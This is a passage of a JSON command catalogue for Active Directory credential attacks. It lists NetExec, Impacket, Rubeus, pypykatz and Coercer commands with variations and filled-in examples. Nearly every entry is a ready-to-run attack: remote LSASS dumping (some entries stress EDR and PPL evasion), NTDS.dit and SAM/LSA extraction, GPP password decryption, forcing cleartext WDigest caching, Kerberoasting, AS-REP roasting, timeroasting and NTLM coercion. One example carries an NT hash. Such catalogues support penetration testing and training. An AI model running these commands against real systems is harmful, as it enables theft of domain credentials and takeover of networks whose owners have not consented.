          "url": "https://github.com/Pennyw0rth/NetExec/releases"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.0/24 -u administrator -p 'Password123!' -M eventlog_creds"
      ]
    },
    {
      "id": "nxc-gpp-password",
      "name": "NetExec gpp_password Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M gpp_password",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Search SYSVOL for Group Policy Preferences XML files containing AES-encrypted cpassword values, then decrypt them with the well-known Microsoft key. Free local admin or service-account credentials when present.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "gpp",
        "cpassword",
        "sysvol",
        "credentials"
      ],
      "variations": [
        {
          "label": "Autologin Variant",
          "requires": "password",
          "command": "nxc smb <target> -u '<user>' -p '<password>' -M gpp_autologin"
        }
      ],
      "references": [
        {
          "title": "MS14-025",
          "url": "https://learn.microsoft.com/en-us/security-updates/securitybulletins/2014/ms14-025"
        }
      ],
      "examples": [
        "nxc smb dc.corp.local -u jdoe -p 'Password123!' -M gpp_password"
      ]
    },
    {
      "id": "nxc-lsassy",
      "name": "NetExec lsassy Module (Remote LSASS Dump)",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M lsassy",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump LSASS remotely via the lsassy module — uses procdump/comsvcs/dllinjection methods, parses on the fly with pypykatz, and never drops the dump file to disk on the attacker side. Requires local admin on the target.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "lsassy",
        "lsass",
        "credentials",
        "pypykatz"
      ],
      "variations": [
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "nxc smb <target> -u '<user>' -H '<hash>' -M lsassy"
        },
        {
          "label": "Specific Method",
          "requires": "password",
          "command": "nxc smb <target> -u '<user>' -p '<password>' -M lsassy -o METHOD=comsvcs"
        }
      ],
      "references": [
        {
          "title": "lsassy",
          "url": "https://github.com/Hackndo/lsassy"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.0/24 -u administrator -p 'Password123!' -M lsassy"
      ]
    },
    {
      "id": "nxc-masky",
      "name": "NetExec masky Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M masky -o CA='<ca-fqdn>\\\\<ca-name>'",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Remotely abuse a vulnerable certificate template (typically User) to enroll certificates as every interactively-logged-on user on the target host, then convert each cert to its NT hash. Requires local admin and a valid AD CS template.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "masky",
        "adcs",
        "user-credentials"
      ],
      "references": [
        {
          "title": "Masky",
          "url": "https://github.com/Z4kSec/Masky"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.10 -u administrator -p 'Password123!' -M masky -o CA='ca.corp.local\\\\CORP-CA'"
      ]
    },
    {
      "id": "nxc-nanodump",
      "name": "NetExec nanodump Module",
      "command": "nxc smb <target> -u '<user>' -p '<password>' -M nanodump",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump LSASS using the nanodump BOF/PE technique — minimal dump, fewer EDR signatures than full minidumps, parsed locally with pypykatz. Requires local admin.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "nanodump",
        "lsass",
        "evasion"
      ],
      "variations": [
        {
          "label": "Hash Auth",
          "requires": "hash",
          "command": "nxc smb <target> -u '<user>' -H '<hash>' -M nanodump"
        }
      ],
      "references": [
        {
          "title": "nanodump",
          "url": "https://github.com/fortra/nanodump"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.10 -u administrator -p 'Password123!' -M nanodump"
      ]
    },
    {
      "id": "nxc-smb-backup-operator",
      "name": "NetExec SMB Backup Operator",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M backup_operator",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Abuse Backup Operators group membership to dump registry hives (SAM, SYSTEM, SECURITY)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "backup-operator",
        "registry",
        "sam",
        "credential-dumping"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M backup_operator"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'backupuser' -p 'password' -M backup_operator"
      ]
    },
    {
      "id": "nxc-smb-dpapi-hash",
      "name": "NetExec SMB DPAPI Hash",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M dpapi_hash",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract DPAPI master key hashes from remote hosts for offline cracking",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "dpapi",
        "masterkey",
        "credential-dumping",
        "hash"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M dpapi_hash"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M dpapi_hash"
      ]
    },
    {
      "id": "nxc-smb-handlekatz",
      "name": "NetExec SMB HandleKatz",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M handlekatz",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump LSASS credentials by duplicating process handles to bypass PPL/AV restrictions",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "handlekatz",
        "lsass",
        "credential-dumping",
        "ppl-bypass"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M handlekatz"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M handlekatz"
      ]
    },
    {
      "id": "nxc-smb-masky",
      "name": "NetExec SMB Masky",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M masky -o CA='<ca_server>\\<ca_name>'",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Abuse ADCS to request certificates for all logged-on users and extract their NT hashes",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "masky",
        "adcs",
        "certificate",
        "credential-dumping"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M masky -o CA='<ca_server>\\<ca_name>'"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M masky -o CA='ca01.corp.local\\CORP-CA'"
      ]
    },
    {
      "id": "nxc-smb-ntds",
      "name": "NetExec SMB NTDS Dump",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --ntds",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump the NTDS.dit database from a Domain Controller to extract all domain hashes",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "ntds",
        "credential-dumping",
        "domain-controller",
        "hashes"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' --ntds"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache --ntds"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -p 'password' --ntds"
      ]
    },
    {
      "id": "nxc-smb-ntdsutil",
      "name": "NetExec SMB NTDSUtil Dump",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M ntdsutil",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump NTDS.dit using ntdsutil IFM method (creates install-from-media backup)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "ntdsutil",
        "ntds",
        "credential-dumping",
        "ifm"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M ntdsutil"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc smb '<ip>' -u '<user>' --use-kcache -M ntdsutil"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M ntdsutil"
      ]
    },
    {
      "id": "nxc-smb-sam-lsa",
      "name": "NetExec SMB SAM & LSA Dump",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --sam --lsa",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Dump SAM database and LSA secrets from a remote Windows system via NetExec",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "sam",
        "lsa",
        "hashes",
        "dump"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' --sam --lsa"
        },
        {
          "label": "With Log File",
          "requires": "password",
          "command": "nxc smb '<ip>' -u '<user>' -p '<password>' --sam --lsa --log nxc-dump"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.31' -u 'user' -p 'password' --sam --lsa",
        "nxc smb '192.168.1.31' -u 'user' -p 'password' --sam --lsa --log us-mgmt-sam"
      ]
    },
    {
      "id": "nxc-smb-wdigest",
      "name": "NetExec SMB WDigest Enable",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M wdigest -o ACTION=enable",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Enable or disable WDigest authentication to force cleartext password caching in LSASS",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "wdigest",
        "cleartext",
        "lsass",
        "credential-dumping"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M wdigest -o ACTION=enable"
        },
        {
          "label": "Disable WDigest",
          "requires": "password",
          "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M wdigest -o ACTION=disable"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'administrator' -p 'password' -M wdigest -o ACTION=enable"
      ]
    },
    {
      "id": "nxc-timeroast",
      "name": "NetExec timeroast Module",
      "command": "nxc smb <dc-ip> -u '' -p '' -M timeroast",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Timeroast: brute computer-account passwords via the MS-SNTP authenticated NTP exchange. The DC signs replies with the machine-account RC4 key derived from its password, which can be cracked offline. No prior credentials required — the DC will sign for any computer RID you specify.",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "netexec",
        "nxc",
        "timeroast",
        "ms-sntp",
        "machine-account",
        "offline-cracking"
      ],
      "references": [
        {
          "title": "Timeroast research",
          "url": "https://github.com/SecuraBV/Timeroast"
        }
      ],
      "examples": [
        "nxc smb 10.10.10.10 -u '' -p '' -M timeroast"
      ]
    },
    {
      "id": "pypykatz-sam",
      "name": "Pypykatz SAM Dump",
      "command": "pypykatz registry --sam <sam_file> <system_file>",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract hashes from SAM and SYSTEM registry files",
      "platform": "linux",
      "requires": [
        "shell"
      ],
      "protocols": [],
      "tags": [
        "pypykatz",
        "sam",
        "registry",
        "hashes"
      ],
      "examples": [
        "pypykatz registry --sam SAM SYSTEM"
      ]
    },
    {
      "id": "rubeus-dump",
      "name": "Rubeus dump",
      "command": "Rubeus.exe dump /nowrap",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract every Kerberos ticket currently in memory across all logon sessions. Requires elevation for other users' tickets. /service:krbtgt narrows to TGTs; /luid:<id> targets one session.",
      "platform": "windows",
      "requires": [
        "local-admin"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "rubeus",
        "ticket-dump",
        "lsass"
      ],
      "variations": [
        {
          "label": "TGTs Only",
          "requires": "local-admin",
          "command": "Rubeus.exe dump /service:krbtgt /nowrap"
        },
        {
          "label": "Specific LUID",
          "requires": "local-admin",
          "command": "Rubeus.exe dump /luid:0x<luid> /nowrap"
        }
      ],
      "examples": [
        "Rubeus.exe dump /service:krbtgt /nowrap"
      ]
    },
    {
      "id": "rubeus-harvest",
      "name": "Rubeus harvest",
      "command": "Rubeus.exe harvest /interval:30",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Continuously monitor LSA for new TGTs and auto-renew them before expiry. Long-running collection — pair with a beacon's screen output. Requires elevation for cross-session capture.",
      "platform": "windows",
      "requires": [
        "local-admin"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "rubeus",
        "harvest",
        "ticket-collection"
      ],
      "examples": [
        "Rubeus.exe harvest /interval:30"
      ]
    },
    {
      "id": "rubeus-tgtdeleg",
      "name": "Rubeus tgtdeleg",
      "command": "Rubeus.exe tgtdeleg /nowrap",
      "category": "credential-attacks",
      "subcategory": "hash-dumping",
      "description": "Extract a usable TGT for the current user without elevation by abusing the GSS-API delegation flow. The cleanest way to grab a TGT from a low-priv shell — no LSASS touching, no admin needed.",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "rubeus",
        "tgt",
        "delegation",
        "opsec"
      ],
      "examples": [
        "Rubeus.exe tgtdeleg /nowrap"
      ]
    },
    {
      "id": "asreproast",
      "name": "Impacket AS-REP Roast",
      "command": "impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast '<domain>/<user>:<password>'",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "AS-REP Roasting for accounts without Kerberos Pre-Authentication",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "asreproast",
        "kerberos",
        "hash"
      ],
      "variations": [
        {
          "label": "No Creds (user list)",
          "requires": "no-creds",
          "command": "impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast '<domain>/' -usersfile <wordlist>"
        },
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast -hashes ':<hash>' '<domain>/<user>'"
        }
      ],
      "references": [
        {
          "title": "AS-REP Roasting",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
        }
      ],
      "examples": [
        "impacket-GetNPUsers -dc-ip 192.168.1.100 -request -outputfile hashes.asreproast 'CORP/user:password'",
        "impacket-GetNPUsers -dc-ip 192.168.1.100 -request -outputfile hashes.asreproast 'CORP/' -usersfile users.txt"
      ]
    },
    {
      "id": "gettgt-kerberoast",
      "name": "Impacket Get TGT",
      "command": "impacket-getTGT '<domain>/<user>:<password>' -dc-ip <ip>; export KRB5CCNAME='<user>.ccache'",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Get TGT to be used in Kerberos authentication",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "tgt",
        "kerberos",
        "ticket"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-getTGT -hashes ':<hash>' '<domain>/<user>' -dc-ip <ip>; export KRB5CCNAME='<user>.ccache'"
        }
      ],
      "examples": [
        "impacket-getTGT 'CORP.LOCAL/user:password' -dc-ip 192.168.1.100; export KRB5CCNAME='user.ccache'",
        "impacket-getTGT -hashes ':e656e07c56d831611b577b160b259ad2' voleur.htb/administrator -dc-ip 10.10.11.76"
      ]
    },
    {
      "id": "kerberoasting",
      "name": "Impacket Kerberoast",
      "command": "impacket-GetUserSPNs -request -dc-ip '<ip>' '<domain>/<user>:<password>' -outputfile kerberoasting.hashes",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Extract service account hashes via Kerberoasting",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "kerberoast",
        "spn",
        "service-account",
        "hash"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-GetUserSPNs -request -dc-ip '<ip>' -hashes ':<hash>' '<domain>/<user>' -outputfile kerberoasting.hashes"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "impacket-GetUserSPNs -request -dc-ip '<ip>' -k -no-pass '<domain>/<user>' -outputfile kerberoasting.hashes"
        },
        {
          "label": "Cross-Domain",
          "requires": "password",
          "command": "impacket-GetUserSPNs -request '<domain>/<user>:<password>' -outputfile kerberoasting.hashes -target-domain '<target_domain>'"
        }
      ],
      "examples": [
        "impacket-GetUserSPNs -request -dc-ip '192.168.1.100' 'CORP/user:password' -outputfile kerberoasting.hashes"
      ]
    },
    {
      "id": "impacket-keylistattack",
      "name": "Impacket KeyListAttack",
      "command": "impacket-keylistattack -rodcNo '<rodc_number>' -rodcKey '<aes_key>' '<domain>/<user>:<password>' -dc-ip '<ip>' -full-scan",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Abuse RODC (Read-Only DC) credential caching to retrieve hashes for accounts cached on the RODC",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "impacket",
        "rodc",
        "keylist",
        "credential-dumping",
        "kerberos"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-keylistattack -rodcNo '<rodc_number>' -rodcKey '<aes_key>' -hashes ':<hash>' '<domain>/<user>' -dc-ip '<ip>' -full-scan"
        }
      ],
      "examples": [
        "impacket-keylistattack -rodcNo '17185' -rodcKey 'aabbcc...' 'CORP.LOCAL/rodcadmin:password' -dc-ip '192.168.1.100' -full-scan"
      ]
    },
    {
      "id": "GetUserSPNs-request-user",
      "name": "Impacket Targeted Kerberoast",
      "command": "impacket-GetUserSPNs -request-user <target_user> -dc-ip <dc-ip> '<domain>/<user>:<password>'",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Request a TGS only for a specific service account instead of every kerberoastable user in the domain. Stealthier (one ticket request, one event) and useful when you already know the high-value SPN you care about.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos",
        "ldap"
      ],
      "tags": [
        "impacket",
        "kerberoast",
        "spn",
        "tgs",
        "targeted",
        "stealth"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "impacket-GetUserSPNs -request-user <target_user> -hashes ':<hash>' -dc-ip <dc-ip> '<domain>/<user>'"
        },
        {
          "label": "Output to File",
          "requires": "password",
          "command": "impacket-GetUserSPNs -request-user <target_user> -dc-ip <dc-ip> '<domain>/<user>:<password>' -outputfile kerb.txt"
        }
      ],
      "references": [
        {
          "title": "Impacket — GetUserSPNs.py",
          "url": "https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py"
        },
        {
          "title": "The Hacker Recipes — Kerberoasting",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
        }
      ],
      "examples": [
        "impacket-GetUserSPNs -request-user sqlsvc -dc-ip 10.10.10.10 'CORP/jdoe:Password123!'",
        "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"
      ]
    },
    {
      "id": "nxc-ldap-asreproasting",
      "name": "NetExec LDAP AS-REP Roasting",
      "command": "nxc ldap <dc-ip> -u <user> -p <password> --asreproast <output.txt>",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Request AS-REP responses for every account with DONT_REQ_PREAUTH set and write hashes to a file ready for hashcat (-m 18200). Works without authentication if you supply '' for the password and have a valid user list.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "nxc",
        "netexec",
        "asreproast",
        "preauth",
        "kerberos"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap <dc-ip> -u <user> -H <hash> --asreproast <output.txt>"
        },
        {
          "label": "Unauthenticated With User List",
          "requires": "no-creds",
          "command": "nxc ldap <dc-ip> -u <users.txt> -p '' --asreproast <output.txt>"
        }
      ],
      "references": [
        {
          "title": "NetExec — LDAP Protocol",
          "url": "https://www.netexec.wiki/ldap-protocol"
        },
        {
          "title": "The Hacker Recipes — ASREProast",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/asreproast"
        }
      ],
      "examples": [
        "nxc ldap 10.10.10.10 -u jdoe -p 'Password123!' --asreproast asrep.txt",
        "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt"
      ]
    },
    {
      "id": "nxc-ldap-kerberoasting",
      "name": "NetExec LDAP Kerberoasting",
      "command": "nxc ldap <dc-ip> -u <user> -p <password> --kerberoasting <output.txt>",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Request TGS tickets for every account with a SPN and write hashes to a file ready for hashcat (-m 13100). Performed entirely over LDAP+Kerberos in a single command, no separate GetUserSPNs invocation needed.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap",
        "kerberos"
      ],
      "tags": [
        "nxc",
        "netexec",
        "kerberoasting",
        "spn",
        "tgs"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap <dc-ip> -u <user> -H <hash> --kerberoasting <output.txt>"
        },
        {
          "label": "Filter by SPN OU",
          "requires": "password",
          "command": "nxc ldap <dc-ip> -u <user> -p <password> --kerberoasting <output.txt> --kdcHost <dc-fqdn>"
        }
      ],
      "references": [
        {
          "title": "NetExec — LDAP Protocol",
          "url": "https://www.netexec.wiki/ldap-protocol"
        },
        {
          "title": "The Hacker Recipes — Kerberoasting",
          "url": "https://www.thehacker.recipes/ad/movement/kerberos/kerberoast"
        }
      ],
      "examples": [
        "nxc ldap 10.10.10.10 -u jdoe -p 'Password123!' --kerberoasting kerb.txt",
        "hashcat -m 13100 kerb.txt /usr/share/wordlists/rockyou.txt"
      ]
    },
    {
      "id": "nxc-ldap-pre2k",
      "name": "NetExec LDAP Pre-Windows 2000 Accounts",
      "command": "nxc ldap '<ip>' -u '<user>' -p '<password>' -M pre2k",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Enumerate pre-Windows 2000 compatible computer accounts that use the hostname as password",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "ldap"
      ],
      "tags": [
        "nxc",
        "ldap",
        "pre2k",
        "computer-account",
        "weak-password",
        "enumeration"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc ldap '<ip>' -u '<user>' -H '<hash>' -M pre2k"
        },
        {
          "label": "Kerberos Ticket",
          "requires": "ticket",
          "command": "nxc ldap '<ip>' -u '<user>' --use-kcache -M pre2k"
        }
      ],
      "examples": [
        "nxc ldap '192.168.1.100' -u 'user' -p 'password' -M pre2k"
      ]
    },
    {
      "id": "nxc-smb-timeroast",
      "name": "NetExec SMB Timeroast",
      "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M timeroast",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Exploit NTP to request hashes for computer accounts without a password (Timeroasting)",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "smb"
      ],
      "tags": [
        "nxc",
        "smb",
        "timeroast",
        "ntp",
        "computer-account",
        "hash"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M timeroast"
        }
      ],
      "examples": [
        "nxc smb '192.168.1.100' -u 'user' -p 'password' -M timeroast"
      ]
    },
    {
      "id": "rubeus-asktgt",
      "name": "Rubeus asktgt",
      "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt-hash> /domain:<domain> /nowrap",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Request a TGT for a user with a password, NT hash, or AES key. /ptt injects it into the current session; /createnetonly spawns a sacrificial process. The Rubeus equivalent of getTGT.py.",
      "platform": "windows",
      "requires": [
        "hash"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "rubeus",
        "asktgt",
        "tgt",
        "overpass-the-hash"
      ],
      "variations": [
        {
          "label": "Password Auth",
          "requires": "password",
          "command": "Rubeus.exe asktgt /user:<user> /password:<password> /domain:<domain> /nowrap"
        },
        {
          "label": "AES256",
          "requires": "aes-key",
          "command": "Rubeus.exe asktgt /user:<user> /aes256:<aes-key> /domain:<domain> /nowrap"
        },
        {
          "label": "Inject Ticket",
          "requires": "hash",
          "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt-hash> /domain:<domain> /ptt"
        },
        {
          "label": "OPSEC Sacrificial Process",
          "requires": "hash",
          "command": "Rubeus.exe asktgt /user:<user> /rc4:<nt-hash> /domain:<domain> /createnetonly:C:\\Windows\\System32\\cmd.exe"
        }
      ],
      "examples": [
        "Rubeus.exe asktgt /user:jdoe /rc4:abcd1234... /domain:corp.local /ptt"
      ]
    },
    {
      "id": "rubeus-kerberoast",
      "name": "Rubeus kerberoast",
      "command": "Rubeus.exe kerberoast /outfile:hashes.txt",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Roast every kerberoastable account in the domain from a Windows host. Auto-discovers SPNs via LDAP and dumps hashcat-13100 hashes. /usetgtdeleg avoids requesting tickets with your own creds; /rc4opsec skips AES-only accounts (no downgrade alarm).",
      "platform": "windows",
      "requires": [
        "shell"
      ],
      "protocols": [
        "kerberos",
        "ldap"
      ],
      "tags": [
        "rubeus",
        "kerberoast",
        "spn"
      ],
      "variations": [
        {
          "label": "Specific User",
          "requires": "shell",
          "command": "Rubeus.exe kerberoast /user:<target-user> /outfile:hashes.txt"
        },
        {
          "label": "OPSEC (RC4 only)",
          "requires": "shell",
          "command": "Rubeus.exe kerberoast /rc4opsec /usetgtdeleg /outfile:hashes.txt"
        },
        {
          "label": "Console Output",
          "requires": "shell",
          "command": "Rubeus.exe kerberoast /simple /nowrap"
        }
      ],
      "references": [
        {
          "title": "Rubeus",
          "url": "https://github.com/GhostPack/Rubeus"
        }
      ],
      "examples": [
        "Rubeus.exe kerberoast /outfile:hashes.txt"
      ]
    },
    {
      "id": "targeted-kerberoast",
      "name": "Targeted Kerberoast",
      "command": "python targetedKerberoast.py -v --dc-ip '<ip>' -u '<user>' -p '<password>' -d '<domain>' -f hashcat -o targeted_kerberoasting.hash",
      "category": "credential-attacks",
      "subcategory": "kerberoasting",
      "description": "Targeted Kerberoasting attack on specific accounts",
      "platform": "cross-platform",
      "requires": [
        "password"
      ],
      "protocols": [
        "kerberos"
      ],
      "tags": [
        "kerberoast",
        "targeted",
        "spn",
        "hash"
      ],
      "variations": [
        {
          "label": "NTLM Hash",
          "requires": "hash",
          "command": "python targetedKerberoast.py -v --dc-ip '<ip>' -u '<user>' -H '<hash>' -d '<domain>' -f hashcat -o targeted_kerberoasting.hash"
        }
      ],
      "examples": [
        "python targetedKerberoast.py -v --dc-ip '192.168.1.100' -u 'user' -p 'password' -d 'CORP.LOCAL' -f hashcat -o targeted_kerberoasting.hash"
      ]
    },
    {
      "id": "coercer",
      "name": "Coercer",
      "command": "python3 Coercer.py coerce -l <listener_ip> -t <target_ip>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Coerce NTLM authentication using multiple RPC protocols",
      "platform": "linux",
      "requires": [
        "no-creds"
      ],
      "protocols": [
        "rpc",
        "ntlm"
      ],
      "tags": [
        "coercer",
        "coercion",
        "ntlm",
        "relay",
        "rpc"
      ],
      "variations": [
        {
          "label": "With Credentials",
          "requires": "password",
          "command": "python3 Coercer.py coerce -l <listener_ip> -t <target_ip> -u '<user>' -p '<password>' -d '<domain>'"
        }
      ],
      "examples": [
        "python3 Coercer.py coerce -l 192.168.1.50 -t 192.168.1.100",
        "python3 Coercer.py coerce -l 192.168.1.50 -t 192.168.1.100 -u 'user' -p 'password' -d 'corp.local'"
      ]
    },
    {
      "id": "coercer-scan",
      "name": "Coercer Scan (Find Coercion Vectors)",
      "command": "coercer scan -u '<user>' -p '<password>' -d '<domain>' -t <target>",
      "category": "credential-attacks",
      "subcategory": "ntlm-relay",
      "description": "Probe a target for every known authentication-coercion RPC method (PetitPotam, PrinterBug, DFSCoerce, MSEven, etc.). Use scan first to confirm which calls succeed before launching coerce.",
      "platform": "linux",
      "requires": [
        "password"
      ],
      "protocols": [
        "rpc",
        "smb"
      ],
      "tags": [
        "coercer",
        "coercion",
        "petitpotam",
        "printerbug",
        "dfscoerce"
      ],
      "variations": [
        {
          "label": "Coerce All Working Vectors",
          "requires": "password",
          "command": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <target> -l <listener-ip>"
        },
        {
          "label": "Specific Method",
          "requires": "password",
          "command": "coercer coerce -u '<user>' -p '<password>' -d '<domain>' -t <target> -l <listener-ip> --filter-method-name PetitPotam"
        }
      ],
      "references": [
        {
          "title": "Coercer",
          "url": "https://github.com/p0dalirius/Coercer"
        }
      ],
      "examples": [
